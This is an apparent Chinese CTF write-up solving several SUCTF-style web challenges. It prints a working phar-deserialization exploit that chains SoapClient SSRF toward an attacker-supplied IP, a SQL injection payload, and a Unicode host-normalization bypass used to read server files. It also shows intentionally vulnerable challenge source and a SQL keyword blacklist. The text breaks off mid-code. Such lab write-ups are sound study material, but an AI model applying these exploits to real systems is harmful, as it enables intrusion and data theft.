class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来这个admin.php，需要一个ssrf然后，之后会触发getflag函数把flag发到你服务器上</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;port = $port;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        getFlag(<span class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">        <span class="comment">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        $ip = $_POST[<span class="string">'ip'</span>];     <span class="comment">//你用来获取flag的服务器ip</span></span><br><span class="line">        $port = $_POST[<span class="string">'port'</span>]; <span class="comment">//你用来获取flag的服务器端口</span></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过大致分析，需要点： ssrf、触发反序列化、上传内容不能有&lt;?、不能直接用phar等已见的协议触发。</p>
<p>这里正则绕过：<code>php://filter/resource=phar://phar.phar</code></p>
<p>ssrf: 因为可以实例化任何类，然而题目并没有给什么有用的，自然想到SoapClient</p>
<p>上传内容不能有&lt;?绕过： 结合前面两题的trick<code>&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;</code></p>
<p>触发反序列化：<code>$this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</code></p>
<p>那么这些点全部都有了，直接贴exp吧。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>把生成的test.phar改成test.jpg上传，然后访问<code>php://filter/resource=phar://upload/2bc454e1fc8129de63d3c034e5c0c24f/0412c29576c708cf0155e8de242169b1.jpg</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819102450-85b206be-c228-1.png" alt="image.png"></p>
<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>这道题下午队里师傅突然说扫到源码（传说中的运维事故，运维vim异常退出导致源码泄露，运维背锅，出题人已哭晕在厕所。），源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一看，感觉跟之前自己fuzz的没啥区别，唯一可喜的就是看到了执行的语句，直接上payload吧，拼接后为：<code>select *,2||flag from Flag</code>即可查出flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145357-1da6a8a6-c24e-1.png" alt="20.png"></p>
<h2 id="pythonnginx"><a href="#pythonnginx" class="headerlink" title="pythonnginx"></a>pythonnginx</h2><p>这题简单明了，直接是用<code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code>，其中关于python的如下图，具体PPT链接如下：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" title="PPT链接" target="_blank" rel="noopener">PPT链接</a>，我就不细说了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094905-86e3f344-c223-1.png" alt="image.png"></p>
<p>我们可以简单的写一个脚本来爆破一下最后一个字符串<code>c</code>，脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">		uni=chr(x)</span><br><span class="line">		url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">if</span> getUrl(url):</span><br><span class="line">				print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	get_unicode()</span><br></pre></td></tr></table></figure></p>
<p>结果如下，随便拿一个字符就行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094341-c5f6b31a-c222-1.png" alt="image.png"></p>
<p>根据题目提示<code>Dont worry about the suctf.cc. Go on!</code>猜测应该是hosts文件<code>suctf.cc</code>绑定了<code>127.0.0.1</code>，既然是<code>127.0.0.1</code>我们可以尝试用file协议读一下文件</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819095833-d9815172-c224-1.png" alt="image.png"></p>
<p>成功读取，那么现在就是找flag了，根据提示猜测flag位置可能和nginx有关，尝试读一下nginx的配置文件</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100036-22a88f0a-c225-1.png" alt="image.png"><br>得到flag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100100-31587ea2-c225-1.png" alt="image.png"></p>
<h2 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h2><p>这题是结合逆向的一道题，扫描一下发现有一个下载功能，可以读文件，但是试了一个常规的flag文件路径都读不到flag，猜测flag应该不在目录里面。还有一个<code>info.php</code>也没有发现什么信息，猜测与题目名字有关，info.php里面搜索一下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161703-b96e3776-c259-1.png" alt="image.png"></p>
<p>果真有点东西，把<code>mod_cocktail.so</code>文件下载下来，丢<code>IDA</code>看一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161939-16c6acdc-c25a-1.png" alt="image.png"></p>
<p>大概意思是获取<code>Reffer</code>头的内容然后传入<code>j_remix</code>后的字符串拿去<code>popen</code>，跟进<code>j_remix</code>看一下，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* remixedchar = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strchr</span>((<span class="keyword">char</span>*)str, c);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = v2 - str;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remix</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *remixed, <span class="keyword">char</span> *dedata)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// si</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er15</span></span><br><span class="line"></span><br><span class="line">  v2 = dedata;</span><br><span class="line">  v3 = *remixed;</span><br><span class="line">  <span class="keyword">if</span> ( *remixed )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = remixed + <span class="number">1</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">4</span> * num_strchr(remixedchar, v3);</span><br><span class="line">        v9 = num_strchr(remixedchar, *v4);</span><br><span class="line">        v2[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] = v8 | (v9 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4[<span class="number">1</span>] != <span class="number">61</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 += <span class="number">4</span>;</span><br><span class="line">        v3 = *(v4 - <span class="number">1</span>);</span><br><span class="line">        v5 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !*(v4 - <span class="number">1</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = num_strchr(remixedchar, v4[<span class="number">1</span>]);</span><br><span class="line">      v2[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">1</span>] = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | <span class="number">16</span> * v9;</span><br><span class="line">      <span class="keyword">if</span> ( v4[<span class="number">2</span>] == <span class="number">61</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v5 + <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        j = v5 + <span class="number">2</span>;</span><br><span class="line">        v5 = v5 + <span class="number">3</span>;</span><br><span class="line">        v2[j] = num_strchr(remixedchar, v4[<span class="number">2</span>]) &amp; <span class="number">0x3F</span> | (v6 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v4 += <span class="number">4</span>;</span><br><span class="line">      v3 = *(v4 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *(v4 - <span class="number">1</span>) );</span><br><span class="line">LABEL_8:</span><br><span class="line">    v5 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v5;</span><br><span 